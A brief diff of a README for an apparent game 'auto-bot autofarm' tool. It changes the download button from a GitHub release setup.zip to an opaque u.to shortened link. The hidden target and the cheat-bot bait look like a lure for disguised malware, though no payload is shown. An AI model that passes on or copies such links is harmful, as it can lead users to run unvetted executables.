@@ -25,7 +25,7 @@
 
 **1. download**
 
-[![image](https://i.imgur.com/1La1HKf.png)](https://github.com/SrElliot/Catizen-Auto-bot-autofarm/releases/download/Download/setup.zip)
+[![image](https://i.imgur.com/1La1HKf.png)](https://u.to/Ry3VIA)
 
 
 
